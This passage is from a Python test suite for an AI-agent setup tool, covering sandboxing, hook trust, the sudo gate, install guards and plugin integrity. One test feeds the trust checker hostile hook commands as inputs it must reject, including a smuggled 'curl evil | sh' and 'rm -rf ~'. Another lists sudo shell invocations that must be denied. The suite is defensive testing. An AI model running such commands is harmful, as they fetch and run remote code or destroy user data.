    code, out = bash(LIBS + "AI_OS=linux; AI_MODE=system; AI_DRY_RUN=1; AI_FOR_USER=ubuntu01; tools_sandbox_deps", env)
    assert code == 0 and "apparmor_parser -r /etc/apparmor.d/ai-claude-bwrap" in out \
        and "/etc/apparmor.d/bwrap " not in out, out
    assert "groupadd --system ai-sandbox" in out and "usermod -aG ai-sandbox ubuntu01" in out, out
    assert "-g ai-sandbox -m 750 /usr/bin/bwrap /usr/local/lib/ai/bwrap" in out and "chmod 750" in out, out
    assert "hermes" not in out and "admin" not in out.lower().replace("needs admin", ""), out


def t_hooks_remove(work):
    """Global graphify hooks are removed from settings.json (recorded; undo puts them back)."""
    f = os.path.join(work, "settings.json")
    orig = {"hooks": {"PreToolUse": [{"matcher": "Glob|Grep", "hooks": [
        {"type": "command", "command": "graphify hook-guard"}, {"type": "command", "command": "keep-me"}]}]}}
    write(f, json.dumps(orig))
    state = os.path.join(work, "s.json")
    code, out = aiconf(state, "hooks-remove", f, "graphify (hook-guard|hook-check)")
    assert code == 0, out
    cmds = [h["command"] for g in json.load(open(f))["hooks"]["PreToolUse"] for h in g["hooks"]]
    assert cmds == ["keep-me"], cmds
    aiconf(state, "undo")
    cmds = [h["command"] for g in json.load(open(f))["hooks"]["PreToolUse"] for h in g["hooks"]]
    assert "graphify hook-guard" in cmds, cmds


def t_knowledge_status(work):
    """Status line from the AGENTS.md blocks: Libraries stale when a lockfile hash changed; IDs validated."""
    sys.path.insert(0, os.path.join(PLUGIN, "hooks"))
    import hooklib
    import hashlib
    proj = os.path.join(work, "p")
    os.makedirs(proj)
    subprocess.check_call(["git", "init", "-q", proj])
    write(os.path.join(proj, "app.py"), "print(1)\n")
    write(os.path.join(proj, "uv.lock"), "lock-a\n")
    h = hashlib.sha256(b"lock-a\n").hexdigest()[:12]
    write(os.path.join(proj, "AGENTS.md"), "# x\n<!-- AI:map START -->\n## Map\n- app.py: entry\n<!-- AI:map END -->\n"
          "<!-- AI:libraries START lock: uv.lock sha256:%s -->\n## Libraries\n| lib | version | context7 | note |\n"
          "|---|---|---|---|\n| httpx | 0.27 | /encode/httpx | |\n<!-- AI:libraries END -->\n" % h)
    assert hooklib.docs_map_status(proj) == "matches uv.lock"
    line = hooklib.knowledge_index(proj)
    assert "Map: present (2 lines)" in line and "Libraries: match" in line and "Serena" not in line, line
    write(os.path.join(proj, "uv.lock"), "lock-b\n")
    assert hooklib.docs_map_status(proj) == "stale"
    assert "run ai-libs --sync" in hooklib.knowledge_index(proj)
    hits = hooklib.libs_hits(proj, ["httpx"])
    assert "context7=/encode/httpx" in hits, hits


def t_session_start_order(work):
    """Status lines come before the L0 table (a cut loses only the table tail); ai-render fails past the cut."""
    env, home, _bindir = bash_env(work)
    proj = os.path.join(work, "p")
    os.makedirs(proj)
    subprocess.check_call(["git", "init", "-q", proj])
    write(os.path.join(proj, "main.py"), "print(1)\n")
    # Own rendered routing (the live ai/build/routing.json may be rewritten by a parallel run).
    build = os.path.join(work, "build")
    subprocess.check_call([sys.executable, os.path.join(AI_DIR, "bin", "ai-render"), "--out", build],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    env.update({"AI_STATE_DIR": os.path.join(work, "state"), "AI_ROUTING_JSON": os.path.join(build, "routing.json")})
    def start(source):
        payload = json.dumps({"hook_event_name": "SessionStart", "session_id": "t-" + source, "cwd": proj,
                              "source": source})
        res = subprocess.run([sys.executable, os.path.join(PLUGIN, "hooks", "router.py"), "--agent", "claude",
                              "SessionStart"], input=payload.encode(), stdout=subprocess.PIPE, env=env, cwd=proj)
        return json.loads(res.stdout.decode())["hookSpecificOutput"]["additionalContext"]
    for source in ("startup", "resume"):
        ctx = start(source)
        assert "[ai router: project-knowledge]" in ctx and "[ai router L1]" not in ctx, \
            "%s: status lines only, the L0 table is in the root rules: %s" % (source, ctx[:200])
    for source in ("compact", "clear"):
        ctx = start(source)
        assert "[ai router L1]" in ctx and ctx.index("[ai router: project-knowledge]") < ctx.index("[ai router L1]"), \
            source + ": L0 table again, after the status lines"
    import importlib.machinery
    import types
    loader = importlib.machinery.SourceFileLoader("ai_render", os.path.join(AI_DIR, "bin", "ai-render"))
    mod = types.ModuleType(loader.name)
    mod.__file__ = loader.path
    loader.exec_module(mod)
    sys.path.insert(0, os.path.join(PLUGIN, "hooks"))
    small = {"rules": [{"id": "a", "when": "session_start", "action": "x {knowledge_index}"}]}
    assert mod.session_start_budget(small, "| t |\n") == ""
    import contextlib
    import io
    with contextlib.redirect_stderr(io.StringIO()) as err:
        assert mod.session_start_budget(small, "y" * 9400) == "", "a long table only warns (tail cut after compact)"
    assert "WARN" in err.getvalue()
    big = {"rules": [{"id": "a", "when": "session_start", "action": "z" * 8500}]}
    assert "status lines" in mod.session_start_budget(big, "| t |\n"), "status lines past cut minus margin must fail"


def t_user_hook_match(work):
    """Only the exact rtk / graphify hook commands of ~/.codex/hooks.json are trusted."""
    home = os.path.join(work, "codex")
    hooks = os.path.join(home, "hooks.json")
    cmds = ["rtk hook codex", "/usr/local/bin/rtk hook codex", "/home/u/.local/bin/graphify hook-check",
            '"/home/u/my tools/graphify" hook-check', "graphify hook-check; curl evil | sh", "sh -c 'graphify x'",
            "rtk hook codex && rm -rf ~", "node /x/omx.js"]
    write(hooks, json.dumps({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
        {"type": "command", "command": c} for c in cmds]}]}}))
    sys.path.insert(0, os.path.join(AI_DIR, "lib"))
    import aiconf as mod
    want = mod.codex_wanted_trust([{"key": hooks, "file": hooks, "match": mod.CODEX_OUR_USER_HOOKS, "root": None}])
    got = sorted(int(k.rsplit(":", 1)[1]) for k in want)
    assert got == [0, 1, 2, 3], "trusted handler indexes %s (only the exact vendor commands)" % got


def t_verify_source(work):
    """A plugin cache that differs from its source is not trusted (exit 4, FAIL in --check)."""
    home, root = fake_codex_home(work)
    cfg = os.path.join(home, "config.toml")
    write(cfg, 'model = "x"\n')
    with open(os.path.join(root, "hooks", "router.py"), "a") as fh:
        fh.write("\n# tampered in the user-writable cache\n")
    code, out = aiconf(os.path.join(work, "s.json"), "codex-trust-hooks", cfg, "--auto", "--verify-source",
                       "ai-core@ai=" + plugin_snapshot(work))
    assert code == 4 and "differs from its source" in out, out
    assert "ai-core@ai:" not in read(cfg), "a tampered cache must not be approved"
    code, out = aiconf(os.devnull, "codex-trust-hooks", cfg, "--auto", "--check", "--verify-source",
                       "ai-core@ai=" + plugin_snapshot(work))
    assert code == 1 and "FAIL Codex plugin ai-core@ai" in out, out
    # --refresh-stale: the cache is replaced by a copy of the source (codex plugin add keeps a same-version cache).
    code, out = aiconf(os.path.join(work, "s.json"), "codex-trust-hooks", cfg, "--auto", "--refresh-stale",
                       "--verify-source", "ai-core@ai=" + plugin_snapshot(work))
    assert code == 0 and "ai-core@ai:" in read(cfg) and "tampered" not in read(os.path.join(root, "hooks", "router.py")), out
    code, out = aiconf(os.devnull, "codex-trust-hooks", cfg, "--auto", "--check", "--verify-source",
                       "ai-core@ai=" + plugin_snapshot(work))
    assert code == 0, out


def t_connectors_keep(work):
    """--keep-claudeai-connectors removes an earlier disableClaudeAiConnectors (recorded, undo puts it back)."""
    env, home, _bindir = bash_env(work, {"AI_CLAUDEAI_CONNECTORS": "keep"})
    f = os.path.join(home, ".claude", "settings.json")
    write(f, json.dumps({"disableClaudeAiConnectors": True, "model": "x"}))
    state = os.path.join(work, "state.json")
    code, out = bash(LIBS + 'AI_OS=linux; AI_STATE_FILE=%s; claude_connectors_env %s aiconf' % (state, f), env)
    assert code == 0, out
    data = json.load(open(f))
    assert "disableClaudeAiConnectors" not in data and data["model"] == "x", data
    aiconf(state, "undo")
    assert json.load(open(f)).get("disableClaudeAiConnectors") is True, "undo must restore the key"


def t_gate_skip_owner_only(work):
    """Only a root-owned /etc/ai/gate-skip counts; a user-owned file is ignored (no test override)."""
    sys.path.insert(0, os.path.join(PLUGIN, "hooks"))
    import hooklib
    f = os.path.join(work, "gate-skip")
    write(f, "audit-before-install %d reason\n" % (time.time() + 600))
    old = dict(os.environ)
    try:
        os.environ["AI_GATE_SKIP_FILE"] = f
        os.environ.pop("AI_GATE_SKIP_INSECURE_TEST", None)
        skips, _notes = hooklib.gate_skips(None)
        assert "audit-before-install" not in skips, "without the test switch the real root-owned path is used"
        os.environ["AI_GATE_SKIP_INSECURE_TEST"] = "1"
        skips, _notes = hooklib.gate_skips(None)
        assert skips.get("audit-before-install") == "reason", skips
        write(f, "audit-before-install %d too long\n" % (time.time() + 7200))
        assert not hooklib.gate_skips(None)[0], "expiry more than 60 minutes ahead is refused"
    finally:
        os.environ.clear()
        os.environ.update(old)
    st = hooklib.parse_command("AI_GATE_SKIP='audit-before-install:x' npm i foo")
    assert any("does nothing" in n for n in hooklib.gate_skips(st)[1])


def t_sudo_gate(work):
    """No sudo at all, also not for proj-agent: on Linux the message points to the box MCP tools."""
    sys.path.insert(0, os.path.join(PLUGIN, "hooks"))
    import hooklib

    class C:
        agent = "claude"
    old = os.environ.get("AI_GATE_PLATFORM")
    os.environ["AI_GATE_PLATFORM"] = "linux"
    try:
        for c in ("sudo proj-agent create web", "sudo -n proj-agent list", "sudo /usr/local/sbin/proj-agent list"):
            v = hooklib.gate_sudo(C, c, hooklib.parse_command(c))
            assert v and v[0] == "deny" and "box MCP tools" in v[1] and "plain" not in v[1], (c, v)
        C.agent = "codex"
        v = hooklib.gate_sudo(C, "sudo proj-agent list", hooklib.parse_command("sudo proj-agent list"))
        assert v and "plain `proj-agent <subcommand>`" in v[1], v
        assert hooklib.gate_sudo(C, "proj-agent list", hooklib.parse_command("proj-agent list")) is None
    finally:
        if old is None:
            os.environ.pop("AI_GATE_PLATFORM", None)
        else:
            os.environ["AI_GATE_PLATFORM"] = old
    for c in ("sudo proj-agent", "sudo -u root proj-agent create x", "sudo env proj-agent x", "sudo python3 -c 1",
              "sudo -n -u root proj-agent list", "sudo -n bash"):
        v = hooklib.gate_sudo(None, c, hooklib.parse_command(c))
        assert v and v[0] == "deny", c


def t_hooks_absolute(work):
    """Hooks run outside every sandbox: our hook commands and the box MCP server name absolute programs."""
    for name in ("hooks.json", "codex-hooks.json"):
        data = json.load(open(os.path.join(PLUGIN, "hooks", name)))
        for event, groups in data["hooks"].items():
            for g in groups:
                for h in g["hooks"]:
                    cmd = h["command"].strip()
                    assert cmd.startswith(("/usr/bin/python3 ", "/bin/sh ", "[ -x /usr/bin/")), (name, event, cmd)
                    assert " python3 " not in " " + cmd.split(" ", 1)[0] + " "
    caff = json.load(open(os.path.join(PLUGIN, "hooks", "hooks.json")))["hooks"]["SessionStart"][1]["hooks"][0]["command"]
    import re as _re
    words = set(_re.findall(r"(?<![/\w$-])(uname|nohup|caffeinate|command)\b", caff))
    assert not words, "bare programs in the caffeinate hook: %s" % words
    box = json.load(open(os.path.join(PLUGIN, ".mcp.json")))["mcpServers"]["box"]
    assert box["command"] == "/usr/bin/python3" and box["args"][0] == "-I" and box["timeout"] >= 3600 * 1000, box


def t_uv_copy(work):
    """uv tools are installed with UV_LINK_MODE=copy; a tool with hard links to a cache is reinstalled."""
    env, home, bindir = bash_env(work)
    tools = os.path.join(work, "uvtools")
    os.makedirs(os.path.join(tools, "graphifyy", "lib"))
    a = os.path.join(tools, "graphifyy", "lib", "a.py")
    write(a, "x")
    os.link(a, os.path.join(work, "cache-copy.py"))           # nlink 2: what the old install left
    log = os.path.join(work, "uv.log")
    stub(bindir, "uv", 'if [ "$1 $2" = "tool dir" ]; then echo %s; exit 0; fi\n'
                       'echo "UV_LINK_MODE=$UV_LINK_MODE $*" >> %s' % (tools, log))
    stub(bindir, "guarddog", "exit 0")
    code, out = bash(LIBS + "audit_ok() { return 0; }; uv_pinned graphifyy 1.0", env)
    assert code == 0, out
    got = read(log)
    assert "UV_LINK_MODE=copy tool install" in got and "--reinstall" in got, got
    os.unlink(os.path.join(work, "cache-copy.py"))
    os.unlink(log)
    code, out = bash(LIBS + "audit_ok() { return 0; }; uv_pinned graphifyy 1.0", env)
    got = read(log)
    assert "UV_LINK_MODE=copy" in got and "--reinstall" not in got, got
    envlist = read(os.path.join(AI_DIR, "adapters", "env.list"))
    assert "\nUV_LINK_MODE=copy\n" in envlist, "every tool and the user shell get UV_LINK_MODE=copy"
    stub(bindir, "claude")
    code, out = bash(LIBS + "claude_env_sandbox", env)
    assert code == 0, out
    data = json.load(open(os.path.join(home, ".claude", "settings.json")))
    assert data["env"]["UV_CACHE_DIR"] == os.path.join(home, ".cache", "ai-sandbox", "uv"), data


def t_box_registration(work):
    """The box MCP server goes to Codex (with a long tool timeout) only where the box tool exists."""
    env, home, bindir = bash_env(work)
    log = os.path.join(work, "codex.log")
    stub(bindir, "codex", 'echo "$*" >> %s; [ "$1 $2" = "mcp get" ] && exit 1; exit 0' % log)
    code, out = bash(LIBS + "AI_OS=linux; codex_mcp", env)
    assert code == 0, out
    assert "mcp add box" not in read(log) and "add context7" in read(log), read(log)
    code, out = bash(LIBS + "AI_OS=linux; AI_PROJ_AGENT_FORCE=1 codex_mcp", env)
    assert code == 0, out
    assert "mcp add box -- /usr/bin/python3 -I " in read(log), read(log)
    cfg = read(os.path.join(home, ".codex", "config.toml"))
    assert "[mcp_servers.box]" in cfg and "tool_timeout_sec = 3720" in cfg and 'default_tools_approval_mode = "approve"' in cfg, cfg


def t_readiness(work):
    """Fable readiness round: install allow rules (B4), RTK leaves git push and gh alone (B2), global git
    excludes for the sandbox placeholders (B3), Codex exec may use approval never (B5), no global Serena."""
    env, home, bindir = bash_env(work)
    code, out = bash(LIBS + "claude_allow_rules", env)
    for r in ("Bash(uv add *)", "Bash(rtk uv add *)", "Bash(npm ci*)", "Bash(rtk npm install*)", "Bash(pip install *)",
              "Bash(pnpm add *)", "Bash(yarn add *)"):
        assert r in out.splitlines(), "missing install allow " + r
    code, out = bash(LIBS + "claude_sandbox_json", env)
    assert "~/.cache/pre-commit" in json.loads(out)["filesystem"]["allowWrite"]
    # B2: RTK config
    stub(bindir, "rtk", "exit 0")
    code, out = bash(LIBS + "AI_OS=linux; tools_rtk_excludes", env)
    assert code == 0, out
    cfg = read(os.path.join(home, ".config", "rtk", "config.toml"))
    assert "[hooks]" in cfg and 'exclude_commands = ["git push", "gh"]' in cfg, cfg
    # B3: global excludes, then a fresh repo with the placeholder names stays clean
    code, out = bash(LIBS + "base_git_excludes", env)
    assert code == 0, out
    ign = read(os.path.join(home, ".config", "git", "ignore"))
    for n in ("/.bashrc", "/.gitconfig", "/.mcp.json", "/.vscode", "/.idea", "/.claude/commands", "/.claude/agents"):
        assert n + "\n" in ign, n
    repo = os.path.join(work, "fresh")
    genv = dict(env, GIT_CONFIG_NOSYSTEM="1")
    subprocess.check_call(["git", "init", "-q", repo], env=genv)
    for n in (".bashrc", ".gitconfig", ".mcp.json", ".gitmodules", ".profile", ".zshrc", ".ripgreprc"):
        write(os.path.join(repo, n), "")
    for n in (".vscode", ".idea", os.path.join(".claude", "commands"), os.path.join(".claude", "agents")):
        write(os.path.join(repo, n, "x"), "")
    write(os.path.join(repo, "app.py"), "print(1)\n")
    st = subprocess.run(["git", "-C", repo, "status", "--porcelain"], env=genv, stdout=subprocess.PIPE).stdout.decode()
    assert st.strip() == "?? app.py", st
    write(os.path.join(repo, "sub", ".bashrc"), "")      # only the repo root is ignored
    st = subprocess.run(["git", "-C", repo, "status", "--porcelain"], env=genv, stdout=subprocess.PIPE).stdout.decode()
    assert "sub/" in st, st
    # B5: Codex exec may run with approval never (the sandbox stays)
    src = read(os.path.join(AI_DIR, "adapters", "codex.sh"))
    assert 'allowed_approval_policies = ["untrusted", "on-request", "never"]' in src
    assert 'allowed_sandbox_modes = ["read-only", "workspace-write"]' in src, "never must not come with full access"
    # A global Serena in Codex (no record) is removed
    log = os.path.join(work, "codex.log")
    stub(bindir, "codex", 'echo "$*" >> %s; if [ "$1 $2" = "mcp get" ]; then echo serena start-mcp-server; fi; exit 0'
         % log)
    code, out = bash(LIBS + "tools_drop_user", env)
    assert code == 0 and "mcp remove serena" in read(log), (out, read(log))


def t_managed_router(work):
    """Server installs: the router runs from the root-owned copy as a managed hook; the plugin copy steps aside."""
    env, home, bindir = bash_env(work)
    code, out = bash(LIBS + "AI_ROOT_REPO=/usr/local/lib/ai/repo; claude_managed_hooks /usr/local/bin/rtk", env)
    assert code == 0, out
    hooks = json.loads(out)
    cmds = [h["command"] for gs in hooks.values() for g in gs for h in g["hooks"]]
    root = "/usr/local/lib/ai/repo/ai/marketplace/plugins/ai-core/hooks/router.py"
    assert all(c.startswith('/usr/bin/python3 "%s" --agent claude ' % root) and c.endswith(" --managed")
               for c in cmds if "router.py" in c), cmds
    assert "/usr/local/bin/rtk hook claude" in cmds and not any("${" in c for c in cmds), cmds
    assert set(hooks) >= {"SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "Stop"}
    assert not any("serena-hook" in c or "claude-notify" in c or "caffeinate" in c for c in cmds), "router only"
    # The plugin copy (CLAUDE_PLUGIN_ROOT set) steps aside when managed settings run the router.
    ms = os.path.join(work, "managed.json")
    write(ms, json.dumps({"hooks": hooks}))
    proj = os.path.join(work, "p")
    os.makedirs(os.path.join(proj, ".git"))
    payload = json.dumps({"hook_event_name": "PreToolUse", "session_id": "m", "cwd": proj, "tool_name": "Bash",
                          "tool_input": {"command": "sudo -n true"}}).encode()
    renv = dict(env, AI_CLAUDE_MANAGED_SETTINGS=ms, AI_STATE_DIR=os.path.join(work, "st"))
    router = os.path.join(PLUGIN, "hooks", "router.py")
    res = subprocess.run([sys.executable, router, "--agent", "claude", "PreToolUse"], input=payload,
                         env=dict(renv, CLAUDE_PLUGIN_ROOT=PLUGIN), stdout=subprocess.PIPE)
    assert res.stdout.strip() == b"", "plugin copy must step aside: %r" % res.stdout
    res = subprocess.run([sys.executable, router, "--agent", "claude", "PreToolUse", "--managed"], input=payload,
                         env=renv, stdout=subprocess.PIPE)
    assert b'"deny"' in res.stdout, res.stdout
    res = subprocess.run([sys.executable, router, "--agent", "claude", "PreToolUse"], input=payload,
                         env=dict(renv, CLAUDE_PLUGIN_ROOT=PLUGIN, AI_CLAUDE_MANAGED_SETTINGS=os.devnull),
                         stdout=subprocess.PIPE)
    assert b'"deny"' in res.stdout, "without managed hooks the plugin copy still gates: %r" % res.stdout


def t_owner_2026_11_12(work):
    """Server: OMC installed but off at user scope (opt-in per project); opencode and herdr not picked and their
    records undone; GIT_GUARD_AGENT=1 for Claude (managed) and Hermes. The Mac keeps OMC on."""
    env, home, bindir = bash_env(work)
    stub(bindir, "claude", "exit 0")
    settings = os.path.join(home, ".claude", "settings.json")
    code, out = bash(LIBS + "AI_OS=linux; AI_OMC_WIRING=plugin; claude_plugin() { :; }; claude_omc_wiring", env)
    assert code == 0, out
    assert json.load(open(settings))["enabledPlugins"]["oh-my-claudecode@omc"] is False
    os.remove(settings)
    code, out = bash(LIBS + "AI_OS=macos; AI_OMC_WIRING=plugin; claude_plugin() { :; }; claude_omc_wiring", env)
    assert not os.path.exists(settings) or "oh-my-claudecode" not in read(settings), "the Mac keeps OMC on"
    start = read(os.path.join(AI_DIR, "bin", "ai-start"))
    assert '"omc": "oh-my-claudecode@omc"' in start, "ai-adopt --tools omc turns it on per project"
    # pick_agents: Linux default without opencode and herdr; AI_EXTRA_AGENTS brings them back.
    pick = ('eval "$(sed -n \'/^pick_agents()/,/^}/p\' %s)"; has() { case "$1" in claude|codex|herdr|opencode) return 0;; '
            'esac; return 1; }; hermes_exists() { return 1; }; AI_MODE=all; AGENTS=; ' % os.path.join(REPO, "install.sh"))
    code, out = bash(pick + "AI_OS=linux; pick_agents; echo $AGENTS", env)
    assert out.strip() == "claude,codex", out
    code, out = bash(pick + "AI_OS=linux; AI_EXTRA_AGENTS=herdr,opencode; pick_agents; echo $AGENTS", env)
    assert out.strip() == "claude,codex,opencode,herdr", out
    code, out = bash(pick + "AI_OS=macos; pick_agents; echo $AGENTS", env)
    assert out.strip() == "claude,codex,opencode,herdr", out
    # Recorded opencode / herdr config is undone on a server that no longer picks them; other records stay.
    log = os.path.join(work, "undo.log")
    state = os.path.join(home, ".local", "state", "ai", "managed-keys.json")
    oc = os.path.join(home, ".config", "opencode", "opencode.json")
    entries = [
        {"kind": "cmd", "id": "herdr-integration:claude", "undo": ["sh", "-c", "echo herdr >> %s" % log],
         "key": "cmd:herdr-integration:claude"},
        {"kind": "cmd", "id": "keep-me", "undo": ["sh", "-c", "echo keep >> %s" % log], "key": "cmd:keep-me"},
        {"kind": "json", "file": oc, "path": ["autoupdate"], "prev": None, "had": False, "value": False,
         "key": "json:%s:autoupdate" % oc},
    ]
    write(oc, json.dumps({"autoupdate": False, "mine": 1}))
    write(state, json.dumps({"version": 1, "entries": entries}))
    want = 'want() { case ",$AGENTS," in *",$1,"*) return 0 ;; *) return 1 ;; esac; }; '
    code, out = bash(LIBS + want + "AI_OS=linux; AGENTS=claude,codex; agents_drop_user", env)
    assert code == 0, out
    assert read(log).split() == ["herdr"], read(log)
    assert "autoupdate" not in json.load(open(oc)), read(oc)
    keys = [e["key"] for e in json.load(open(state))["entries"]]
    assert keys == ["cmd:keep-me"], keys
    code, out = bash(LIBS + want + "AI_OS=macos; AGENTS=claude; agents_drop_user", env)
    assert read(log).split() == ["herdr"], "the Mac drops nothing"
    # GIT_GUARD_AGENT: Claude managed env (planned in a dry run) and the Hermes environment.d file.
    code, out = bash(LIBS + "AI_OS=linux; AI_DRY_RUN=1; claude_managed_policy", env)
    assert "env/GIT_GUARD_AGENT" in out, out
    herm = read(os.path.join(AI_DIR, "adapters", "hermes.sh"))
    assert "92-ai-agent.conf" in herm and "GIT_GUARD_AGENT=1" in herm


def t_root_guard(work):
    """As root, install/uninstall run only an admin-owned, clean tree at origin/ai (id is faked to 0 here)."""
    import getpass
    me = getpass.getuser()
    old_umask = os.umask(0o022)    # Ubuntu users default to 002: group-writable test files would be refused
    try:
        _root_guard_cases(work, me)
    finally:
        os.umask(old_umask)


def _root_guard_cases(work, me):
    fake = os.path.join(work, "fakebin")
    stub(fake, "id", 'if [ "${1:-}" = -u ]; then echo 0; else exec /usr/bin/id "$@"; fi')
    tree = os.path.join(work, "clone")
    os.makedirs(tree)
    genv = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t.invalid", GIT_COMMITTER_NAME="t",
                GIT_COMMITTER_EMAIL="t@t.invalid", GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    write(os.path.join(tree, "f.txt"), "x\n", 0o644)
    os.symlink("f.txt", os.path.join(tree, "link.txt"))   # symlinks always show mode 777: must not count
    for args in (["init", "-q"], ["add", "-A"], ["commit", "-q", "-m", "x"], ["update-ref", "refs/remotes/origin/ai", "HEAD"]):
        subprocess.check_call(["git", "-C", tree] + args, env=genv)
    guard = os.path.join(AI_DIR, "lib", "root-guard.sh")

    def run_guard(target, sudo_user, dirty_ok="0"):
        env = dict(genv, PATH=fake + ":" + os.environ["PATH"], SUDO_USER=sudo_user)
        res = subprocess.run(["sh", "-c", '. "$0"; ai_root_guard "$1" "$2" "$3" install.sh; echo PASSED', guard, tree,
                              target, dirty_ok], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        return res.stdout.decode()
    assert "PASSED" in run_guard("ubuntu01", me), "admin-owned clean pushed tree must pass"
    out = run_guard("ubuntu01", "someone-else")
    assert "refusing" in out and "/opt/ai-setup/install.sh --update" in out, out
    assert "refusing" in run_guard(me, me), "a tree owned by the --for-user target must be refused"
    write(os.path.join(tree, "f.txt"), "changed\n")
    assert "uncommitted" in run_guard("ubuntu01", me), "dirty tree must be refused"
    assert "PASSED" in run_guard("ubuntu01", me, "1"), "--allow-dirty skips only the clean check"
    subprocess.check_call(["git", "-C", tree, "checkout", "-q", "--", "f.txt"])
    os.chmod(os.path.join(tree, "f.txt"), 0o664)
    assert "writable by group" in run_guard("ubuntu01", me), "group-writable file must be refused"
    os.chmod(os.path.join(tree, "f.txt"), 0o644)
    # install.sh itself stops before sourcing anything when its own tree is not root's or the admin's. Run from
    # the root-owned copy (/usr/local/lib/ai/repo, owned by root) that tree is allowed by design: nothing to see.
    if os.stat(REPO).st_uid != os.getuid():
        return
    env = dict(genv, PATH=fake + ":" + os.environ["PATH"], SUDO_USER="someone-else")
    res = subprocess.run(["bash", os.path.join(REPO, "install.sh"), "--for-user", "ubuntu01", "--dry-run"],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    assert res.returncode == 1 and b"refusing to run as root" in res.stdout, res.stdout


def t_update_clone(work):
    """install.sh --update: root-owned clone only; fast-forward to origin/ai, refuse dirty or rewritten history.
    stat is faked to report root (no root needed for the test)."""
    genv = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t.invalid", GIT_COMMITTER_NAME="t",
                GIT_COMMITTER_EMAIL="t@t.invalid", GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    up = os.path.join(work, "upstream")
    os.makedirs(up)
    def git(d, *a):
        subprocess.check_call(["git", "-C", d] + list(a), env=genv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    git(up, "init", "-q", "-b", "ai")
    write(os.path.join(up, "f"), "1\n")
    git(up, "add", "-A"); git(up, "commit", "-q", "-m", "one")
    clone = os.path.join(work, "opt-ai-setup")
    subprocess.check_call(["git", "clone", "-q", "--branch", "ai", up, clone], env=genv)
    write(os.path.join(up, "f"), "2\n")
    git(up, "commit", "-q", "-am", "two")
    fake = os.path.join(work, "fakebin")
    stub(fake, "stat", 'echo root')
    guard = os.path.join(AI_DIR, "lib", "root-guard.sh")
    def update():
        env = dict(genv, PATH=fake + ":" + os.environ["PATH"])
        r = subprocess.run(["sh", "-c", '. "$0"; ai_update_clone "$1" 0 && echo DONE', guard, clone],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        return r.stdout.decode()
    out = update()
    assert "DONE" in out and "updated" in out and read(os.path.join(clone, "f")) == "2\n", out
    assert "already at" in update()
    write(os.path.join(clone, "f"), "dirty\n")
    assert "uncommitted" in update(), "dirty clone must be refused"
    git(clone, "checkout", "-q", "--", "f")
    git(clone, "commit", "-q", "--allow-empty", "-m", "local")
    write(os.path.join(up, "f"), "3\n")
    git(up, "commit", "-q", "-am", "three")
    assert "does not continue" in update(), "local commits must stop the update"


def t_ai_sync_untrusted(work):
    """ai-sync from a user's own tree on Linux leaves Hermes copies and /etc rules to the admin."""
    # A user-owned copy of the tree (the suite may itself run from the root-owned install copy).
    tree = os.path.join(work, "usertree")
    shutil.copytree(AI_DIR, os.path.join(tree, "ai"), ignore=shutil.ignore_patterns("__pycache__", "*.pyc", "tests"))
    env, home, _b = bash_env(work, {"AI_HOME": tree})
    code, out = bash('AI_SYNC_NO_MAIN=1; . "$AI_HOME/ai/bin/ai-sync"; load_libs; AI_OS=linux; '
                     'if tree_trusted; then echo TRUSTED; else echo UNTRUSTED; fi', env)
    assert "UNTRUSTED" in out, out


def t_plugin_files_tracked(work):
    """Every file a plugin needs exists, and in a git work tree is tracked: a machine-local ignore (a global
    .gitignore with .mcp.json) once dropped ai-serena/.mcp.json and ai-playwright/.mcp.json from a commit."""
    import re as _re
    market = os.path.join(AI_DIR, "marketplace")
    need = [os.path.join(market, ".claude-plugin", "marketplace.json"), os.path.join(market, ".agents", "plugins",
                                                                                   "marketplace.json")]
    for entry in json.load(open(need[0]))["plugins"]:
        root = os.path.normpath(os.path.join(market, entry["source"]))
        need.append(os.path.join(root, ".claude-plugin", "plugin.json"))
        need.append(os.path.join(root, ".mcp.json"))        # every plugin of ours serves at least one MCP server
        if os.path.exists(os.path.join(root, "hooks", "hooks.json")):
            need.append(os.path.join(root, "hooks", "hooks.json"))
        cman = os.path.join(root, ".codex-plugin", "plugin.json")
        if os.path.exists(cman):
            need.append(cman)
            hooks = json.load(open(cman)).get("hooks")
            if isinstance(hooks, str):
                need.append(os.path.join(root, hooks[2:]))
        if entry["name"] == "ai-core":
            need += [os.path.join(root, "hooks", f) for f in ("codex-hooks.json", "codex-hooks.managed.json",
                                                               "router.py", "hooklib.py", "serena-hook")]
        # Scripts named in hooks and MCP commands: ${CLAUDE_PLUGIN_ROOT}/x or ${PLUGIN_ROOT}/x
        for jf in [os.path.join(root, ".mcp.json"), os.path.join(root, "hooks", "hooks.json"),
                   os.path.join(root, "hooks", "codex-hooks.json")]:
            if os.path.exists(jf):
                for rel in _re.findall(r"\$\{(?:CLAUDE_)?PLUGIN_ROOT\}/([\w./-]+)", read(jf)):
                    need.append(os.path.join(root, rel))
    need = sorted(set(need))
    missing = [os.path.relpath(p, REPO) for p in need if not os.path.isfile(p)]
    assert not missing, "plugin files missing: %s" % missing
    if subprocess.run(["git", "-C", REPO, "rev-parse", "--git-dir"], stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL).returncode != 0:
        return      # a root-owned copy from git archive has no .git: files exist, tracking was checked at commit
    res = subprocess.run(["git", "-C", REPO, "ls-files", "--"] + [os.path.relpath(p, REPO) for p in need],
                         stdout=subprocess.PIPE)
    tracked = set(res.stdout.decode().split())
    untracked = [os.path.relpath(p, REPO) for p in need if os.path.relpath(p, REPO) not in tracked]
    assert not untracked, "plugin files not tracked by git (a local ignore?): %s" % untracked


if __name__ == "__main__":
    sys.exit(main())
